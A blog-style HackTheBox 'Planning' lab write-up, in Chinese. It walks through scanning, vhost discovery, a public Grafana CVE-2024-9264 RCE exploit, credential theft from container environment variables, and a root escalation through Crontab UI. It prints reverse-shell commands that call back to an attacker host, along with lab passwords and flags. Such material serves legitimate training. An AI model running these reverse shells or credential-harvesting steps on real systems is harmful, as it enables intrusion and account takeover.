---
title: HackTheBox | Planning (Easy) Write Up
published: 2025-08-14
description: 'HackTheBox | Planning (Easy) Write Up'
image: 'images (1).jpg'
tags: [HTB,Writeup]
category: 'Writeup'
draft: false 
lang: ''
---

# HackTheBox | Planning (Easy) Write Up

## 題目資訊

**Target IP Address:**
10.10.11.68

**Machine Information:**
As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r

## STEP 1. 資訊蒐集

### 錯誤方向
我一開始是用rustscan快速掃目標IP的port
```bash
$ rustscan -a 10.10.11.68 -r 1-65535

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

然後再用nmap去詳細檢查22,80 port資訊
```bash
$ nmap -A -p22,80 -sC -sV 10.10.11.68

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

發現訪問不了`http://planning.htb/`因為是靶機環境的vhost。

解法為在/etc/hosts加入`10.10.11.68 planning.htb`，可以成功訪問，然後用dirsearch去看目錄

```bash
$ dirsearch -u http://planning.htb/

Target: http://10.10.11.68/

[04:46:20] Starting:
[04:46:24] 301 -  178B  - /js  ->  http://planning.htb/js/
[04:46:42] 200 -   12KB - /about.php
[04:47:16] 200 -   10KB - /contact.php
[04:47:18] 301 -  178B  - /css  ->  http://planning.htb/css/
[04:47:33] 301 -  178B  - /img  ->  http://planning.htb/img/
[04:47:38] 403 -  564B  - /js/
[04:47:40] 403 -  564B  - /lib/
[04:47:40] 301 -  178B  - /lib  ->  http://planning.htb/lib/
```

接下來，我花很多時間去翻裡面東西，但不存在可利用的資訊，到此我去翻別人WriteUp才發現漏掉了掃Domain。

### 正確方向

這邊是使用gobuster去掃vhost

```
$ gobuster vhost -u http://planning.htb -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 50
```

過段時間可以找到`http://granfana.planning.htb`，接著修改`/etc/hosts`成`10.10.11.68 granfana.planning.htb`，即可成功訪問。

![image](https://hackmd.io/_uploads/ByxW4m9uge.png)

## STEP 2.CVE-2024–9264 on Grafana v11.0.0

這邊可以注意到最下方version 11，上網查資料發現存在CVE，可以直接RCE，這裡為我使用的Exploit。
https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

Terminal 1:
```
$ python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.123 --reverse-port 4444
```

Terminal 2:
```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.123] from (UNKNOWN) [10.10.11.68] 44218
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# /bin/bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~#
```

到此我們成功拿到一個Container的機器。

## STEP 3.權限提升至 User

經過一陣檢查可以從env裡面可以看到User帳密(13、14行)
```=
# env
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```

`enzo/RioTecRANDEntANT!`

```
$ ssh enzo@10.10.11.68
enzo@10.10.11.68's password:

enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt
4177a6f2f1ffa41a3b099217ca6a7610
```

## STEP 4.權限提升至 Root

也是經過一陣檢查可以發現cronjobs運行在port 8000，跟明文呈現的密碼`P4ssw0rdS0pRi0T3c`。

![image](https://hackmd.io/_uploads/BkyCGV5_xx.png)

接下來就訪問http://127.0.0.1:8000/，輸入`root/P4ssw0rdS0pRi0T3c`

發現Crontab UI介面可以以root執行任意command，構造一個reverse shell就可以提權至root。

![image](https://hackmd.io/_uploads/H1vREVcOel.png)

```
bash -c 'exec bash -i >& /dev/tcp/10.10.14.123/4444 0>&1'
```

```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.123] from (UNKNOWN) [10.10.11.68] 48142
bash: cannot set terminal process group (1193): Inappropriate ioctl for device
bash: no job control in this shell
root@planning:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@planning:/# cat /root/root.txt
cat /root/root.txt
692d2a5c422baaa8a483e46f6c89502a
```

https://labs.hackthebox.com/achievement/machine/2465396/660